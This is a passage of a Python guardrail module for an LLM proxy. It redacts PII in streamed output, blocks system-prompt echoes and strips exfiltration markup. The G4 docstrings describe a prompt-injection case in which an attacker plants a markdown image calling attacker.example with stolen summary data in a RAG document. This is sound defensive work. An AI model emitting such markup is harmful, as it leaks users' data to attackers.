        rather than a hand-written variant.
        """
        verbose_proxy_logger.warning(
            "guardrail %s could not scan response (%s): %s",
            self.control_id,
            type(exc).__name__,
            exc,
        )
        audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(1)
        data = request_data if isinstance(request_data, dict) else {}
        decision = Decision(
            action=Action.BLOCK,
            control=self.control_id,
            risk=self._control.risk,
            findings=(),
            reason=f"guardrail unavailable: {type(exc).__name__}",
        )
        enforced = self.outage_can_enforce and self._enforcing()
        self._emit(data, decision, (), None, enforced)
        return text

    async def async_post_call_streaming_iterator_hook(
        self,
        user_api_key_dict: Any,
        response: Any,
        request_data: dict[str, Any],
    ) -> Any:
        """Redact PII in a STREAMED response, on the wire.

        Defined on this class and not on `BaseNufiGuardrail`, and that is not
        a style choice: `proxy/utils.py` dispatches on
        `"async_post_call_streaming_iterator_hook" in type(callback).__dict__`,
        which reads the CONCRETE class's own namespace and does not see an
        inherited method. Hoisted to the base, this method would stop being
        found — the dispatch would fall back to the single-slot
        `apply_guardrail` bridge, every rewrite would be discarded again, and
        nothing in-process would report a change. `tests/test_streaming.py`
        asserts the membership directly for exactly this reason.

        Presidio is a network call, so unlike G3 and G4 this control cannot
        scan every chunk. It batches: text accumulates until at least
        `STREAM_PII_BATCH_CHARS` characters have become *emittable* — i.e. are
        already outside the hold-back — and only then is one scan made over
        the whole pending buffer. The hold-back, not the batch size, is what
        makes a split entity impossible to miss, so raising the batch size
        trades time-to-first-token for Presidio load without ever trading
        coverage.
        """
        data = request_data if isinstance(request_data, dict) else {}
        if not self._control.enabled or self._exempt(data):
            async for chunk in response:
                yield chunk
            return

        grounded = self.verified_grounded(data)
        enforced = self._enforcing()

        def make() -> _PiiStream:
            return _PiiStream(self, data, user_api_key_dict, grounded, enforced)

        async for chunk in self._guarded_stream(response, make):
            yield chunk


class _PiiStream(_StreamState):
    """G2b's per-choice buffer: hold back a token that could still be PII."""

    def __init__(
        self,
        guard: G2bPiiOutput,
        data: dict[str, Any],
        key: Any,
        grounded: bool,
        enforced: bool,
    ) -> None:
        super().__init__(guard, data, key)
        self._guard: G2bPiiOutput = guard
        self._grounded = grounded
        self._enforced = enforced
        self._scans = 0
        # One restorer per CHOICE, one vault session per REQUEST. `n>1` produces
        # several independent output streams from one pseudonymized prompt, so
        # each needs its own boundary buffer while resolving against the same
        # mapping.
        self._ref = guard.pseudonym_ref(data)
        self._restorer = pseudonymize.shared().stream_restorer(self._ref)
        self._restore_failed = False

    def deliver(self, text: str, *, final: bool) -> str:
        """Put the user's own values back, on the wire only.

        `text` is what redaction produced and has already been recorded as sent;
        the return value is what the client receives. See `_StreamState.deliver`
        for why those must be different strings here.

        Their `StreamingDeanonymizer` owns the hard part: a surrogate split
        across a chunk boundary is held in its buffer until it completes, bounded
        by `MAX_SURROGATE_LEN`. `flush` releases whatever is left at the end,
        including an incomplete token -- which is emitted as-is rather than
        dropped, because a token the model mangled is a visible oddity while
        silently swallowing the tail truncates the answer.

        Never raises. A failure here would turn a completed response into an
        error for the sake of cosmetics: the surrogate carries no PII, so the
        worst case is the user seeing a token instead of their own address.
        """
        if self._restorer is None:
            return text
        try:
            out = pseudonymize.shared().relabel(self._restorer.feed(text)) if text else ""
            if final:
                out += pseudonymize.shared().relabel(self._restorer.flush())
                # The bare-tag repair, which their buffer cannot do: a model that
                # strips the delimiters produces text that matches neither of
                # their patterns. Run once over the whole tail rather than
                # per-chunk, because a chunk boundary could split `E1` itself.
                out, mangled = pseudonymize.shared().repair_stream_tail(out, self._ref)
                if mangled:
                    audit.GUARDRAIL_PSEUDONYM_RESTORED.labels(
                        control=self._guard.control_id, outcome="mangled"
                    ).inc(mangled)
            return out
        except Exception as exc:  # noqa: BLE001 - see the docstring
            if not self._restore_failed:
                self._restore_failed = True
                verbose_proxy_logger.warning(
                    "guardrail %s could not restore pseudonyms on a stream (%s): %s",
                    self._guard.control_id,
                    type(exc).__name__,
                    exc,
                )
            return text

    def finalize(self) -> None:
        """Wipe the mapping once the stream is done.

        `apply_guardrail` cannot do it for a streamed request: it runs before the
        stream has been consumed, so wiping there would destroy the mapping the
        chunks still need. `purge_session` is idempotent, so several choices
        finalising against one session is fine.
        """
        engine = pseudonymize.shared()
        if self._restorer is not None:
            # Their restorer accumulates these across every chunk, which is the
            # only place the streamed round trip is observable at all: without
            # them `restored_total` would only ever move on the non-streaming
            # path, and a streamed workload would look like one carrying no PII.
            stats = getattr(self._restorer, "stats", None) or {}
            for outcome in ("restored", "fallback"):
                count = int(stats.get(outcome, 0))
                if count:
                    audit.GUARDRAIL_PSEUDONYM_RESTORED.labels(
                        control=self._guard.control_id, outcome=outcome
                    ).inc(count)
        if self._ref:
            engine.end_session(self._ref)
            audit.GUARDRAIL_PSEUDONYM_SESSIONS.set(engine.active_count())

    async def _scan(self, text: str) -> list[Any]:
        # `UNTRUSTED`, not `ASSISTANT` — same reasoning as the non-streamed path
        # in `G2bPiiOutput.apply_guardrail`, and it must stay the SAME as that
        # path: this is the streaming half of one control, and a control whose
        # streamed and non-streamed halves scored against different thresholds
        # would be a protection that depends on `stream: true`.
        spans = [Span(text=text, source=SpanSource.UNTRUSTED, message_index=0)]
        return await self._guard._scan_all(spans) + scan_secrets(spans)

    async def feed(self, text: str, *, final: bool) -> str:
        self._pending += text
        if final:
            self.finished = True
            cut = len(self._pending)
        else:
            cut = self._bound(
                streaming.token_cut(
                    self._pending, STREAM_MAX_HOLD_PII, STREAM_PII_TAIL_TOKENS
                )
            )
            if cut <= 0 or (self._scans and cut < STREAM_PII_BATCH_CHARS):
                # Nothing emittable yet (`cut <= 0`), or not enough of it to be
                # worth another network round trip. Nothing is lost by waiting:
                # that text is inside the hold-back and could not have been
                # emitted anyway.
                #
                # `self._scans and ...` exempts the FIRST scan from the
                # threshold. Without it, time-to-first-token is not one
                # Presidio round trip, it is however long the model takes to
                # produce `STREAM_PII_BATCH_CHARS` emittable characters —
                # measured at +131 ms against +4 ms, for four saved Presidio
                # calls. See the constant's comment for the numbers.
                return ""

        started = time.perf_counter()
        self._scans += 1
        try:
            findings = await self._scan(self._pending)
        except Exception as exc:
            audit.GUARDRAIL_LATENCY.labels(control=self._guard.control_id).observe(
                time.perf_counter() - started
            )
            # Fail open, matching this control's `fail: open` policy and
            # `_on_outage`'s contract: emit the head unredacted rather than
            # stall the stream, and record the outage per request.
            head, self._pending = self._pending[:cut], self._pending[cut:]
            return self._guard._on_outage(head, self._data, exc)
        audit.GUARDRAIL_LATENCY.labels(control=self._guard.control_id).observe(
            time.perf_counter() - started
        )
        audit.GUARDRAIL_DEGRADED.labels(control=self._guard.control_id).set(0)

        # A finding that straddles the cut would be half-emitted and half-held:
        # the emitted half reaches the client, the held half arrives next
        # chunk, and the client's concatenation reassembles the entity intact
        # while the audit trail says it was redacted. Pull the cut back to the
        # finding's own start so it is redacted whole, next round at the
        # latest.
        for finding in findings:
            if finding.start < cut < finding.end:
                cut = finding.start
        if cut <= 0:
            return ""

        head, self._pending = self._pending[:cut], self._pending[cut:]
        decision = decide(
            self._guard._control,
            [finding for finding in findings if finding.end <= cut],
            self._grounded,
        )
        if decision.action is not Action.REDACT:
            return head
        self._guard._emit(self._data, decision, (), self._key, self._enforced)
        if not self._enforced:
            return head
        return self._guard.redact(head, list(decision.findings))

    async def _residual(self) -> Decision | None:
        if not self._sent:
            return None
        return decide(self._guard._control, await self._scan(self._sent), self._grounded)


class G3SystemPromptLeak(BaseNufiGuardrail):
    """Blocks a response that regurgitates the system prompt actually in force.

    Compares the response text against the system prompt via `scan_system_echo`
    (n-gram overlap over CONTIGUOUS word-runs — see that function's docstring
    for its honest blind spots: a paraphrase or reordering is invisible to it,
    and a system prompt shorter than its 8-word window is not checked at all).
    Fires regardless of how the leak was elicited, because the comparison is
    against the OUTPUT, never against the request that produced it.
    """

    control_id = "G3"
    # `async_pre_call_hook`-shaped outage handling: `scan_system_echo` is
    # documented pure (no I/O, never raises — see scanners/patterns.py's
    # module docstring), but `G1Injection`'s own history is the reason
    # nothing in this module trusts a scanner contract absolutely just
    # because it is documented — a bug in a future edit of a "pure"
    # function is still a bug. This control DOES have a real blocking
    # mechanism (`GuardrailBlocked` below), so an outage under `fail:
    # closed` is a genuine block, not a phantom one — declared `True` to
    # match, mirroring `G1Injection` rather than `G2aPiiInput`/`G2bPiiOutput`
    # (which have no such mechanism and correctly declare `False`).
    outage_can_enforce = True

    @staticmethod
    def _system_prompt(request_data: dict[str, Any]) -> str:
        parts = [
            span.text
            for span in extract_spans(request_data.get("messages"))
            if span.source is SpanSource.SYSTEM
        ]
        return "\n".join(parts)

    def _on_outage(self, data: dict[str, Any], exc: Exception) -> None:
        """Record the outage, then act on it — mirrors `G1Injection._on_outage`.

        Called once for a request-wide certification failure (the system
        prompt itself could not be determined — see the malformed-`messages`
        guard below) or once per text whose own `scan_system_echo` call
        raised. Either way this control could not certify THAT text/request
        as leak-free, which is `Decision(action=Action.BLOCK, findings=())`
        by the same reasoning `G1Injection._on_outage` documents: an outage
        always means "we could not certify this", independent of whether
        `fail`/`mode` goes on to act on it. `enforced` is gated by
        `outage_can_enforce` (see the class attribute above) alongside
        `fails_closed` and `_enforcing()`, so a future edit that ever drops
        the `= True` override cannot silently start raising anyway — the
        exact defensive shape `G1Injection._on_outage` already uses this
        gate for.
        """
        verbose_proxy_logger.warning(
            "guardrail %s could not certify response (%s): %s",
            self.control_id,
            type(exc).__name__,
            exc,
        )
        audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(1)
        decision = Decision(
            action=Action.BLOCK,
            control=self.control_id,
            risk=self._control.risk,
            findings=(),
            reason=f"guardrail unavailable: {type(exc).__name__}",
        )
        enforced = self.outage_can_enforce and self._control.fails_closed and self._enforcing()
        event = self._emit(data, decision, (), None, enforced)
        if enforced:
            raise GuardrailBlocked(
                code="GUARDRAIL_UNAVAILABLE",
                event_id=event["event_id"],
                detail=_block_detail("GUARDRAIL_UNAVAILABLE", event["event_id"]),
                status_code=503,
            )

    async def apply_guardrail(
        self,
        inputs: dict[str, Any],
        request_data: dict[str, Any] | None,
        input_type: str,
        logging_obj: Any = None,
    ) -> dict[str, Any]:
        if self._exempt(request_data):
            return inputs

        """Block a response that echoes the system prompt.

        Same real `apply_guardrail` contract as `G2bPiiOutput` — see that
        method's docstring for why the signature and the `"response"`-only
        gate are load-bearing, verified against the installed
        litellm==1.83.10 source rather than the docs page.

        Each text is scanned and decided ON ITS OWN: nothing on `Finding`
        identifies which text produced it (same reasoning `G2bPiiOutput`
        documents), and a text with `n>1` candidate completions must not
        have a leak in one candidate block a clean sibling from ever being
        evaluated — the loop below raises as soon as ONE text's own
        decision blocks, rather than pooling every text's findings into a
        single request-wide verdict first.
        """
        if input_type != "response" or not self._control.enabled:
            return inputs

        texts = inputs.get("texts") or []
        if not texts:
            return inputs

        data = request_data if isinstance(request_data, dict) else {}
        messages = data.get("messages")
        if messages is not None and (
            not isinstance(messages, list)
            or any(not isinstance(message, dict) for message in messages)
        ):
            # Same malformed-shape risk `G1Injection` guards against:
            # `extract_spans` (called by `_system_prompt` below) assumes a
            # list of dict messages and is off limits to modify here. We
            # cannot even determine what the system prompt IS, so nothing
            # downstream can be certified — routed through `_on_outage`
            # rather than raising `AttributeError` from deep inside
            # `extract_spans`, an exception type this hook does not expect.
            self._on_outage(data, TypeError("'messages' is not a list of dicts"))
            return inputs

        system_prompt = self._system_prompt(data)
        if not system_prompt:
            # No system message in the request (or one too short for
            # `scan_system_echo`'s own `_MIN_SYSTEM_PROMPT_WORDS` gate to
            # bother comparing — that shorter-prompt case is instead caught
            # inside `scan_system_echo` itself, per-text, below). Nothing to
            # compare the response against, so there is nothing to leak.
            # Silent — no audit event — matching every other control's
            # "nothing to evaluate" shortcut (`G1Injection`'s `if not spans`,
            # `G2bPiiOutput`'s `if not texts`): an ALLOW with no finding never
            # gets an event either, so this is not a new exception to that
            # rule, just reached one branch earlier.
            return inputs

        for item in texts:
            if not isinstance(item, str) or not item:
                continue

            started = time.perf_counter()
            try:
                findings = scan_system_echo(item, system_prompt)
            except Exception as exc:
                # Caught broadly, not narrowed to a specific type: matches
                # every other control in this module (`G1Injection`,
                # `G2aPiiInput`, `G2bPiiOutput`) — trusting `scan_system_echo`'s
                # documented "pure, never raises" contract absolutely is one
                # bug away from turning a shadow-mode measurement, or this
                # control's own fail-closed guarantee, into an unhandled
                # exception escaping the LiteLLM hook. Scoped to THIS text —
                # a scan failure on one candidate must not discard another
                # text's already-computed, already-audited decision in the
                # same batch (the Task 11 lesson `G2bPiiOutput.apply_guardrail`
                # documents at length).
                audit.GUARDRAIL_LATENCY.labels(control=self.control_id).observe(
                    time.perf_counter() - started
                )
                self._on_outage(data, exc)
                continue
            audit.GUARDRAIL_LATENCY.labels(control=self.control_id).observe(
                time.perf_counter() - started
            )
            audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(0)

            decision = decide(self._control, findings, grounded=False)
            if decision.action is Action.ALLOW:
                continue

            enforced = self._enforcing()
            event = self._emit(data, decision, (), None, enforced)
            if enforced:
                raise GuardrailBlocked(
                    code="LLM07_SYSTEM_PROMPT_LEAK",
                    event_id=event["event_id"],
                    detail=_block_detail("LLM07_SYSTEM_PROMPT_LEAK", event["event_id"]),
                    status_code=400,
                )

        return inputs

    async def async_post_call_streaming_iterator_hook(
        self,
        user_api_key_dict: Any,
        response: Any,
        request_data: dict[str, Any],
    ) -> Any:
        """Block a STREAMED response that starts echoing the system prompt.

        What "blocking" can honestly mean mid-stream
        --------------------------------------------
        It cannot mean what it means on a non-streamed response: by the time
        anything is detectable, a prefix of the answer is already on the
        client's screen and no hook can retract it. A 400 with a refusal body
        is likewise impossible — the status and headers went out with the
        first chunk.

        What it CAN mean, and does here, is that the text which trips the
        control is never sent. The accumulated response is scanned BEFORE the
        chunk that completes the echo is yielded, and on a finding this hook
        raises instead of yielding, so that chunk does not go out; litellm's
        `async_streaming_data_generator` turns the `GuardrailBlocked` into an
        in-band SSE `{"error": ...}` frame carrying the same refusal text and
        `event_id` the non-streamed path returns.

        That the ALREADY-sent prefix is also leak-free is a proof, not a hope,
        and it needs no buffering at all — see `_EchoStream`'s docstring for
        the monotonicity argument and the property test behind it. So this is
        the one of the three streaming controls that adds no hold-back and no
        time-to-first-token.

        The remaining honest gap, stated because it is real: a client that
        renders as it streams has already displayed the prefix, and nothing at
        this layer can make it un-display. This control withholds the leak; it
        does not make the request atomic. And the prefix may contain
        sub-threshold overlap with the system prompt — that is not a
        concession, it is what `policy.yaml`'s threshold means, and the same
        text on a non-streamed response would also be allowed.
        """
        data = request_data if isinstance(request_data, dict) else {}
        if not self._control.enabled or self._exempt(data):
            async for chunk in response:
                yield chunk
            return

        messages = data.get("messages")
        if messages is not None and (
            not isinstance(messages, list)
            or any(not isinstance(message, dict) for message in messages)
        ):
            # Same malformed-shape guard as `apply_guardrail`: `extract_spans`
            # assumes a list of dict messages, so the system prompt cannot be
            # determined and nothing downstream can be certified.
            self._on_outage(data, TypeError("'messages' is not a list of dicts"))
            async for chunk in response:
                yield chunk
            return

        system_prompt = self._system_prompt(data)
        if not self._can_fire(system_prompt):
            # Nothing this control could ever flag on this request: no system
            # message, or one too short for `scan_system_echo`'s window. Pass
            # the stream through UNBUFFERED rather than holding 12 words back
            # for a check that is structurally incapable of firing — this is
            # what keeps the added time-to-first-token at zero for the many
            # requests (plain API calls, title generation) that carry no
            # system prompt at all.
            async for chunk in response:
                yield chunk
            return

        def make() -> _EchoStream:
            return _EchoStream(self, data, user_api_key_dict, system_prompt)

        async for chunk in self._guarded_stream(response, make):
            yield chunk

    def _can_fire(self, system_prompt: str) -> bool:
        """Could ANY output trip this control against this system prompt?

        Probed rather than assumed, by asking the shipped scanner and the
        shipped policy the strongest possible question: if the model echoed the
        system prompt back verbatim, in full, would that be flagged? A `no`
        means no output can ever be flagged (the prompt is empty, or shorter
        than `scan_system_echo`'s window), so the hold-back would be pure
        latency for a check that cannot fire.

        Written as a probe instead of `len(words) >= 8` on purpose: the 8 lives
        in `scan_system_echo` as a private constant and a default argument, and
        a copy of it here would be a second source of truth that silently stops
        matching the first.
        """
        if not system_prompt:
            return False
        try:
            findings = scan_system_echo(system_prompt, system_prompt)
        except Exception:  # noqa: BLE001 - a probe must not break a request
            # Cannot prove it is inert, so treat it as live and buffer.
            return True
        return decide(self._control, findings, grounded=False).action is not Action.ALLOW


class _EchoStream(_StreamState):
    """G3's per-choice state. Scans, and blocks — but holds nothing back.

    G3 needs NO hold-back, and that is a proof rather than an optimisation.
    The invariant it needs is "the text already sent does not trip this
    control", and scanning the accumulated text BEFORE emitting the chunk that
    completes it already gives that, at any threshold:

      * Let chunk k be the first at which the accumulated text trips. Then the
        accumulated text through k-1 did NOT trip — it was scanned, and it was
        allowed.
      * Everything sent so far is a PREFIX of the text through k-1, and shingle
        overlap is monotone in the text: a prefix's overlapping-shingle set is
        a subset of the whole's, so its score can only be lower. (Checked by
        execution over 4000 random texts × every prefix, not by argument
        alone — `tests/test_patterns.py` pins the property.)
      * Chunk k itself is never emitted, because `feed` raises instead of
        returning.

    So the emitted text cannot trip, no matter where the chunk boundaries fall
    and no matter what threshold `policy.yaml` sets. This is why G3's design
    differs from G2b's and G4's: a BLOCKING control only has to keep what it
    sent below the line, while a REWRITING control has to keep the
    CONCATENATION clean — and a concatenation of individually-clean prefixes is
    not clean, which is exactly what a hold-back exists to fix.

    The practical payoff is that G3 adds no buffering and therefore no
    time-to-first-token at all.

    An earlier draft did hold back 12 words and, on detecting, re-scanned the
    already-sent text to decide whether the leak had "escaped". Mutation
    testing killed it: replacing that re-scan with a literal `False` changed
    no test, because by the argument above the re-scan can only ever return
    ALLOW. It was a safety check that could not fire, reported as one that
    could — the shape this branch exists to remove — so it is gone rather than
    decorating the code.
    """

    def __init__(
        self,
        guard: G3SystemPromptLeak,
        data: dict[str, Any],
        key: Any,
        system_prompt: str,
    ) -> None:
        super().__init__(guard, data, key)
        self._guard: G3SystemPromptLeak = guard
        self._system_prompt = system_prompt
        self._seen = ""

    def _decide(self, text: str) -> Decision:
        return decide(
            self._guard._control,
            scan_system_echo(text, self._system_prompt),
            grounded=False,
        )

    async def feed(self, text: str, *, final: bool) -> str:
        self._seen += text
        if final:
            self.finished = True

        started = time.perf_counter()
        try:
            decision = self._decide(self._seen)
        except Exception as exc:
            audit.GUARDRAIL_LATENCY.labels(control=self._guard.control_id).observe(
                time.perf_counter() - started
            )
            # May raise `GuardrailBlocked` when this control fails closed and
            # is enforcing — the same outage contract `apply_guardrail` has.
            self._guard._on_outage(self._data, exc)
            return text
        audit.GUARDRAIL_LATENCY.labels(control=self._guard.control_id).observe(
            time.perf_counter() - started
        )
        audit.GUARDRAIL_DEGRADED.labels(control=self._guard.control_id).set(0)

        if decision.action is not Action.ALLOW:
            event = self._guard._emit(
                self._data, decision, (), self._key, self._guard._enforcing()
            )
            if self._guard._enforcing():
                # Raising IS the withholding: this method never returns, so
                # `_guarded_stream` never yields the chunk in hand and the text
                # that trips the threshold is never sent. litellm's
                # `async_streaming_data_generator` converts the exception into
                # an in-band SSE `{"error": ...}` frame carrying `.message`.
                raise GuardrailBlocked(
                    code="LLM07_SYSTEM_PROMPT_LEAK",
                    event_id=event["event_id"],
                    detail=_block_detail(
                        "LLM07_SYSTEM_PROMPT_LEAK", event["event_id"]
                    ),
                    status_code=400,
                )
        return text

    async def _residual(self) -> Decision | None:
        """Nothing to verify, and saying so beats a check that cannot fail.

        `verify` re-scans what a control actually sent. For G3 that text is,
        by the proof in this class's docstring, always a prefix of text this
        control already scanned and allowed — so the re-scan would return
        ALLOW unconditionally. Returning `None` records the absence honestly
        instead of adding a green light that is wired to nothing.
        """
        return None


class G4OutputHandling(BaseNufiGuardrail):
    """Strips exfiltration vectors from a response without discarding it.

    An attacker plants `![](https://attacker.example/log?d=<summary>)` in a
    RAG-indexed document; the model repeats it; the client renders the
    markdown; the browser fetches it with the data attached — no click, no
    other user interaction. Unlike `G3SystemPromptLeak`, this control never
    blocks: discarding a whole answer over one embedded image is
    disproportionate when the fix is to remove the element and keep the rest.
    """

    control_id = "G4"
    # This control has no blocking mechanism at all — every path through
    # `apply_guardrail` and `_on_outage` ends in returning (a possibly
    # rewritten) `inputs`, never `GuardrailBlocked`, in every mode, on every
    # finding. Explicit (matching `G2aPiiInput`'s style) rather than left to
    # the inherited default so the "G4 never blocks" invariant is stated
    # here, next to the class it describes, not just implied by omission —
    # recording `enforced=True` on an outage this control cannot act on
    # would write a phantom entry into `nufi_guardrail_decisions_total
    # {action="block", enforced="true"}`, the series G1Injection shares
    # where every entry IS a real block.
    outage_can_enforce = False

    @staticmethod
    def strip(text: str, findings: list[Any]) -> str:
        """Replace each finding's span with `[removed:ENTITY]`, back to front.

        Mirrors `G2bPiiOutput.redact`'s clamping (see that method's
        docstring for the full reasoning): findings are processed in
        DESCENDING `start` order, and each finding's offsets are clamped to
        `[0, len(text)]` and to the region not yet consumed by a
        previously-processed (higher-start) finding. `scan_exfil`'s three
        finding kinds (`EXTERNAL_IMAGE`, `JAVASCRIPT_URL`, `RAW_HTML`) come
        from non-overlapping regexes today, but trusting "the regexes never
        overlap" absolutely is exactly the assumption an earlier draft of
        `G2bPiiOutput.redact` made about Presidio and the secrets scanner
        before Task 11 found it broken by two independent detectors
        reporting overlapping spans on the same text — unclamped offsets on
        an overlapping or out-of-bounds finding corrupt the surrounding text
        instead of raising, so nothing would ever surface the mistake.
        """
        if not findings:
            return text
        length = len(text)
        out = text
        consumed_from = length
        for finding in sorted(findings, key=lambda f: f.start, reverse=True):
            start = max(0, min(finding.start, length))
            end = max(start, min(finding.end, length))
            end = min(end, consumed_from)
            if start >= end:
                # Fully inside a region a higher-start finding already
                # removed (or an offset that does not fit `text` at all) —
                # nothing left here to act on.
                continue
            label = finding.entity or "REMOVED"
            out = out[:start] + f"[removed:{label}]" + out[end:]
            consumed_from = start
        return out

    def _on_outage(self, item: str, request_data: Any, exc: Exception) -> str:
        """Record the outage, then fail open: return `item` unstripped.

        Mirrors `G2bPiiOutput._on_outage`: `enforced` comes out `False` —
        this control has no mechanism to withhold or alter a response at all
        (unlike `G3SystemPromptLeak`, it never raises `GuardrailBlocked`),
        so recording anything else would claim an effect that never
        happened. Failing open here means an unscanned exfiltration vector
        reaches the client unstripped — the same "invisible unless recorded"
        risk `G2bPiiOutput._on_outage` documents for unredacted PII, so the
        outage is still routed through `_emit` rather than only flipping
        `GUARDRAIL_DEGRADED` (a fleet-wide gauge an operator investigating
        one specific report cannot attach to any one request).

        And, exactly as in `G2bPiiOutput._on_outage`, that `False` is READ
        from `self.outage_can_enforce` rather than written as a literal.
        The eleven-line comment on that attribute above describes it as the
        thing preventing a phantom `enforced=true` in
        `nufi_guardrail_decisions_total{action="block", enforced="true"}` —
        and until the final review it prevented nothing here, because this
        method never consulted it. Flipping `G4.outage_can_enforce = True`
        survived the whole suite.
        """
        verbose_proxy_logger.warning(
            "guardrail %s could not scan response (%s): %s",
            self.control_id,
            type(exc).__name__,
            exc,
        )
        audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(1)
        data = request_data if isinstance(request_data, dict) else {}
        decision = Decision(
            action=Action.BLOCK,
            control=self.control_id,
            risk=self._control.risk,
            findings=(),
            reason=f"guardrail unavailable: {type(exc).__name__}",
        )
        enforced = self.outage_can_enforce and self._enforcing()
        self._emit(data, decision, (), None, enforced)
        return item

    async def apply_guardrail(
        self,
        inputs: dict[str, Any],
        request_data: dict[str, Any] | None,
        input_type: str,
        logging_obj: Any = None,
    ) -> dict[str, Any]:
        if self._exempt(request_data):
            return inputs

        """Strip exfiltration vectors from a response, per text.

        Same real `apply_guardrail` contract as `G2bPiiOutput` and
        `G3SystemPromptLeak` — see `G2bPiiOutput.apply_guardrail`'s
        docstring for why the signature and the `"response"`-only gate are
        load-bearing. Each text is scanned and decided independently, for
        the same reason `G2bPiiOutput` documents: nothing on `Finding`
        identifies which text produced it, and one text's scan failure must
        not discard another text's already-computed, already-audited strip.
        """
        if input_type != "response" or not self._control.enabled:
            return inputs

        texts = inputs.get("texts") or []
        if not texts:
            return inputs

        allowlist = list(self._control.options.get("image_host_allowlist") or [])
        data = request_data if isinstance(request_data, dict) else {}
        # `and not _stream_dispatch_anomaly`: same as
        # `G2bPiiOutput.apply_guardrail` — reaching this method for a streamed
        # response means the iterator hook below was not dispatched, so the
        # strip computed here never reaches the client and `enforced=True`
        # would be a phantom.
        enforced = self._enforcing() and not self._stream_dispatch_anomaly(data)
        rewritten: list[str] = []

        for item in texts:
            if not item:
                rewritten.append(item)
                continue

            started = time.perf_counter()
            try:
                findings = scan_exfil(item, allowlist)
            except Exception as exc:
                # Caught broadly for the same reason as `G2bPiiOutput`:
                # `scan_exfil` is documented pure and never-raising, but
                # trusting that absolutely is one bug away from an unhandled
                # exception escaping this hook. Scoped to THIS item only.
                audit.GUARDRAIL_LATENCY.labels(control=self.control_id).observe(
                    time.perf_counter() - started
                )
                rewritten.append(self._on_outage(item, data, exc))
                continue
            audit.GUARDRAIL_LATENCY.labels(control=self.control_id).observe(
                time.perf_counter() - started
            )
            audit.GUARDRAIL_DEGRADED.labels(control=self.control_id).set(0)

            decision = decide(self._control, findings, grounded=False)
            if decision.action is not Action.REDACT:
                rewritten.append(item)
                continue

            self._emit(data, decision, (), None, enforced)
            rewritten.append(self.strip(item, list(decision.findings)) if enforced else item)

        if enforced:
            inputs["texts"] = rewritten
        return inputs

    async def async_post_call_streaming_iterator_hook(
        self,
        user_api_key_dict: Any,
        response: Any,
        request_data: dict[str, Any],
    ) -> Any:
        """Strip exfiltration vectors from a STREAMED response, on the wire.

        The vector this closes is the one the design opens with, and it is
        specifically a STREAMING vector in practice: a chat client renders
        markdown as the deltas arrive, so
        `![](https://attacker.example/log?d=<summary>)` split as
        `![x](https://att` + `acker.example/leak.png)` is fetched by the
        browser the moment the concatenation completes. Per-chunk scanning sees
        neither half as a match. This hook scans the accumulated buffer and
        emits only the prefix that no partially-written construct could still
        extend into — see `streaming.markup_cut`.

        `scan_exfil` is local regex work, so unlike G2b this runs on every
        chunk; the hold-back exists for correctness across the boundary, not to
        batch anything.

        Defined on this class rather than inherited, for the dispatch reason
        `G2bPiiOutput.async_post_call_streaming_iterator_hook` documents.
        """
        data = request_data if isinstance(request_data, dict) else {}
        if not self._control.enabled or self._exempt(data):
            async for chunk in response:
                yield chunk
            return

        allowlist = list(self._control.options.get("image_host_allowlist") or [])
        enforced = self._enforcing()

        def make() -> _ExfilStream:
            return _ExfilStream(self, data, user_api_key_dict, allowlist, enforced)

        async for chunk in self._guarded_stream(response, make):
            yield chunk


class _ExfilStream(_StreamState):
    """G4's per-choice buffer: hold back a markdown/HTML construct mid-write."""

    def __init__(
        self,
        guard: G4OutputHandling,
        data: dict[str, Any],
        key: Any,
        allowlist: list[str],
        enforced: bool,
    ) -> None:
        super().__init__(guard, data, key)
        self._guard: G4OutputHandling = guard
        self._allowlist = allowlist
        self._enforced = enforced

    async def feed(self, text: str, *, final: bool) -> str:
        self._pending += text
        if final:
            self.finished = True
            cut = len(self._pending)
        else:
            cut = self._bound(
                streaming.markup_cut(self._pending, STREAM_MAX_HOLD_MARKUP)
            )

        started = time.perf_counter()
        try:
            findings = scan_exfil(self._pending, self._allowlist)
        except Exception as exc:
            audit.GUARDRAIL_LATENCY.labels(control=self._guard.control_id).observe(
                time.perf_counter() - started
            )
            head, self._pending = self._pending[:cut], self._pending[cut:]
            return self._guard._on_outage(head, self._data, exc)
        audit.GUARDRAIL_LATENCY.labels(control=self._guard.control_id).observe(
            time.perf_counter() - started
        )
        audit.GUARDRAIL_DEGRADED.labels(control=self._guard.control_id).set(0)

        # A construct whose match straddles the cut must not be half-sent: the
        # client would concatenate the halves back into a live `<img src>`.
        # `markup_cut` already refuses to cut inside an INCOMPLETE construct;
        # this covers a COMPLETE one that happens to span the bound-forced cut.
        for finding in findings:
            if finding.start < cut < finding.end:
                cut = finding.start
        if cut <= 0:
            return ""

        head, self._pending = self._pending[:cut], self._pending[cut:]
        decision = decide(
            self._guard._control,
            [finding for finding in findings if finding.end <= cut],
            grounded=False,
        )
        if decision.action is not Action.REDACT:
            return head
        self._guard._emit(self._data, decision, (), self._key, self._enforced)
        if not self._enforced:
            return head
        return self._guard.strip(head, list(decision.findings))

    async def _residual(self) -> Decision | None:
        if not self._sent:
            return None
        return decide(
            self._guard._control,
            scan_exfil(self._sent, self._allowlist),
            grounded=False,
        )


g1_injection = G1Injection()
g2a_pii_input = G2aPiiInput()
g2b_pii_output = G2bPiiOutput()
g3_system_prompt_leak = G3SystemPromptLeak()
g4_output_handling = G4OutputHandling()

from guardrails.health import (  # noqa: E402
    assert_controls,
    assert_metrics_are_trustworthy,
    guardrail_status,
)

logging.getLogger("nufi.guardrails").warning(
    "guardrail status: %s", guardrail_status(g1_injection._policy)
)
assert_controls(g1_injection._policy)
# Warn if the process configuration makes the numbers above meaningless. A
# comment in docker-compose.yml is not a check; this is the check.
assert_metrics_are_trustworthy()
